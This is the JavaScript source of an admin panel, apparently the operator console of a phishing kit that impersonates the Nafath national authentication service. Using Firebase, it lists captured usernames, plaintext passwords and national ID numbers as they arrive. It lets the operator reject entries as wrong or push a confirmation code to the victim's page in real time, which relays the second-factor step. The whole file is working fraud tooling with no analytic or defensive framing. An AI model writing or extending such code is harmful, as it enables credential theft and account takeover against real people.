// admin.js
import { db } from "./firebase-config.js";
import { 
    collection, 
    onSnapshot,
    doc,
    updateDoc
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    const logsTableBody = document.getElementById('logsTableBody');
    const codeModal = document.getElementById('codeModal');
    const confirmationCodeInput = document.getElementById('confirmationCodeInput');
    const submitCodeBtn = document.getElementById('submitCodeBtn');
    const closeModalBtn = document.getElementById('closeModalBtn');

    let allLogs = {};
    let currentTargetDoc = { id: "", type: "" }; // لحفظ العنصر الذي يتم تعديله حالياً

    function renderTable() {
        logsTableBody.innerHTML = "";
        const sortedLogs = Object.values(allLogs).sort((a,b) => (b.timestamp?.toMillis() || 0) - (a.timestamp?.toMillis() || 0));

        if(sortedLogs.length === 0) {
            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد طلبات...</td></tr>`;
            return;
        }

        sortedLogs.forEach((log) => {
            const row = document.createElement('tr');
            let statusText = log.status === "waiting_admin" ? "بانتظار الأدمن" : log.status;
            let statusClass = log.status === "waiting_admin" ? "waiting" : "action-done";

            // أزرار التحكم والإجراءات الديناميكية
            const actionButtons = `
                <button class="btn-action btn-code" data-id="${log.id}" data-type="${log.type}">رقم تأكيد</button>
                <button class="btn-action btn-wrong-id" data-id="${log.id}" data-type="${log.type}">هوية غير صحيحة</button>
                <button class="btn-action btn-wrong-pass" data-id="${log.id}" data-type="${log.type}">حساب غير صحيح</button>
            `;

            if (log.type === "app_request") {
                row.innerHTML = `
                    <td><span class="type-badge type-app">تطبيق نفاذ</span></td>
                    <td><strong>${log.nationalId || '---'}</strong></td>
                    <td style="color:#95a5a6; font-style:italic;">---</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                    <td>${actionButtons}</td>
                `;
            } else {
                row.innerHTML = `
                    <td><span class="type-badge type-pass">اسم مستخدم</span></td>
                    <td><strong>${log.username || '---'}</strong></td>
                    <td style="color:#c0392b; font-family:monospace;">${log.password || '---'}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                    <td>${actionButtons}</td>
                `;
            }
            logsTableBody.appendChild(row);
        });

        // ربط الأحداث بالأزرار بعد إنشائها
        document.querySelectorAll('.btn-action').forEach(btn => {
            btn.addEventListener('click', handleAction);
        });
    }

    // دالة معالجة نقر الأزرار من الأدمن
    async function handleAction(e) {
        const id = e.target.getAttribute('data-id');
        const type = e.target.getAttribute('data-type');
        const collectionName = type === "app_request" ? "nafath_app_requests" : "users_login";
        const docRef = doc(db, collectionName, id);

        if (e.target.classList.contains('btn-code')) {
            // فتح المودال لإدخال رقم التأكيد
            currentTargetDoc = { id, type };
            codeModal.style.display = "flex";
        } else if (e.target.classList.contains('btn-wrong-id')) {
            await updateDoc(docRef, { status: "wrong_national_id" });
        } else if (e.target.classList.contains('btn-wrong-pass')) {
            await updateDoc(docRef, { status: "wrong_auth_data" });
        }
    }

    // إرسال كود التأكيد للفايربيس لقراءة المستخدم له
    submitCodeBtn.addEventListener('click', async () => {
        const codeValue = confirmationCodeInput.value.trim();
        if(!codeValue) return;

        const collectionName = currentTargetDoc.type === "app_request" ? "nafath_app_requests" : "users_login";
        const docRef = doc(db, collectionName, currentTargetDoc.id);

        await updateDoc(docRef, { 
            status: "show_code",
            verificationCode: codeValue 
        });

        codeModal.style.display = "none";
        confirmationCodeInput.value = "";
    });

    closeModalBtn.addEventListener('click', () => { codeModal.style.display = "none"; });

    // الاستماع اللحظي للمجموعتين
    onSnapshot(collection(db, "users_login"), (s) => { s.forEach(d => allLogs[d.id] = {id:d.id, type:"user_login", ...d.data()}); renderTable(); });
    onSnapshot(collection(db, "nafath_app_requests"), (s) => { s.forEach(d => allLogs[d.id] = {id:d.id, type:"app_request", ...d.data()}); renderTable(); });
});
